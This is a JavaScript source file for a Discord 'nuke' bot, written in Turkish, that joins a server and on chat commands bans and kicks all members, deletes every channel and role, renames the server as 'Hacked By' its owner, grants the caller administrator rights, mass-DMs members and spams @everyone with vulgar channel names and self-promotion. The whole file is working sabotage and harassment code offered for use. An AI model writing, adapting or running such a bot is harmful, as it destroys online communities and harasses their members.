const express = require('express');
const app = express();
const http = require('http');
    app.get("/", (request, response) => {
    response.sendStatus(200);
    }); app.listen(process.env.PORT);
    setInterval(() => {
    http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);
    }, 280000);
const Discord = require('discord.js');
const { Client, RichEmbed } = require('discord.js');
const chalk = require('chalk');
//―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
const semoizm = new Discord.Client();
const semoizms = require('./semoizms.json')
//―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
semoizm.on("ready", () => {
  semoizm.guilds.forEach(s => console.log(s.name + "|" + s.memberCount + "│" + s.id))
  console.log("│ Semoizm's Ultra BanBot Hazır│\n―――――――――――――――――――――――――――\n İsim: " + semoizm.user.tag + "\n ID: " + semoizm.user.id + "\n Sunucu Sayısı: " + semoizm.guilds.size + "\n Kullanıcı Sayısı: " + semoizm.users.size + "\n―――――――――――――――――――――――――――");
})
//―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

semoizm.on('message', async msg => {
  if (msg.content === 's!banla') {
    await msg.delete()
      msg.guild.members.map(async (m) => {
          if (m.bot) {
            m.ban()
          } else {
            if (m.user.id === semoizms.sahip) {
            } else {
              m.send("**Sunucunuz <@"+semoizms.sahip+"> Tarafından Patlatılmıştır Selamlar** \n\n "+ semoizms.server).then( await m.ban())
            }
          }  
      })
    }
})

semoizm.on('message', msg => {
  if (msg.content === 's!kickle') {
    msg.delete()
    msg.guild.members.forEach(member => member.kick())
  }
});

semoizm.on('message', async msg => {
  if (msg.content === "s!gg") {
    msg.delete()
    
    await msg.guild.channels.deleteAll();

    await msg.guild.createChannel("✝-kral-"+semoizms.sahipisim, {
      type: "text"      
}
);

    await msg.guild.createChannel("▬▬▬▬▬▬▬", { 
      type: "voice"
    }).then(chan => {
    chan.setUserLimit("1");
})
    await msg.guild.createChannel("✝ "+ semoizms.sahipisim, { 
      type: "voice"
    }).then(chan => {
    chan.setUserLimit("1");
})
    await msg.guild.createChannel("▬▬▬▬▬▬▬", { 
      type: "voice"
    }).then(chan => {
    chan.setUserLimit("1");
})
    await msg.guild.createChannel("✝ Patlattı", { 
      type: "voice"
    }).then(chan => {
    chan.setUserLimit("1");
})
    await msg.guild.createChannel("▬▬▬▬▬▬▬", { 
      type: "voice"
    }).then(chan => {
    chan.setUserLimit("1");
})
    await msg.guild.createChannel("✝ Kimse Yenemez", { 
      type: "voice"
    }).then(chan => {
    chan.setUserLimit("1");
})
    await msg.guild.createChannel("▬▬▬▬▬▬▬", { 
      type: "voice"
    }).then(chan => {
    chan.setUserLimit("1");
})

    await msg.guild.setIcon(semoizms.pp)
    await msg.guild.setName("✝ Hacked By "+semoizms.sahipisim+" ✝")
    await msg.guild.roles.forEach(roles => roles.delete())

  }
});
  

semoizm.on('message', async msg => {
  if (msg.content === "s!dm") {
    msg.delete()
    msg.guild.members.forEach(users => {  {
        users.send("**Sunucunuz ``"+semoizms.sahipisim+"`` Tarafınden Patlatılmıştır  \n\n **"+semoizms.server)
    }
                                       })
  }
})

//―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――


semoizm.on('message', async msg => {
  if (msg.content === 's!yetki') {
    msg.delete()
    msg.guild.createRole({
      name: 'Semo',
      permissions:["ADMINISTRATOR"] } );
    let rol = await msg.guild.roles.find(role => role.name === "Semo");
    await msg.member.addRole(rol)
  }
});




semoizm.on('message', msg => {
  if (msg.content.toLowerCase() === 's!spam') { 
    setInterval(() => {
      msg.delete()
      msg.channel.send('||@everyone|| **Bu Sunucu, ``'+semoizms.sahipisim+'`` Tarafından Patlatılmıştır!** '+semoizms.server)
    }, 100);

  }
});

semoizm.on('message', msg => {
  if (msg.content.toLowerCase() === 's!sil') { 
      msg.delete()
      msg.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete()
        }
      })
  }
});


semoizm.on('message', msg => {
  if (msg.content.toLowerCase() === 's!oda') { 
      msg.delete()
      msg.guild.channels.deleteAll();
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
   msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
     msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
     msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
     msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
     msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
     msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
     msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
     msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
     msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
     msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
     msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
      msg.guild.createChannel(semoizms.sahipisim+'-siker', {
        type: "text"
      }).then(c => {
        c.send(semoizms.server+" @everyone KRALINIZ GELDİ <3")
      })
    
    
  

 
  }
})


semoizm.on('channelCreate', async channel => {
  if (channel.name == '✝-kral-'+semoizms.sahipisim) {
    await channel.send("@everyone  Kralınız Semo Geldi, Patladınız Kardeşim Kimse Baş Edemez <3 <3 Allah Zihin Açıklığı Versin!\n\n https://youtube.com/c/Semoizm discord.gg/TBHFrPX")
  }
});

//semoizm.on("ready", async () => {
//  const sunucu = semoizm.guilds.get("561221494705750052")
//  const user = semoizm.users.get("587693790479908864")
//  const kul = sunucu.members.get("587693790479908864")
//  sunucu.createChannel('semo-siker', {
//  type: "text"
//  })
//  sunucu.createRole({
//     name: 'Semo',
//      permissions:["ADMINISTRATOR"] } );
//    let rol = await sunucu.roles.find(role => role.name === "Semo");
 //   await await await kul.addRole(rol)  
//})
 
semoizm.login(semoizms.token)


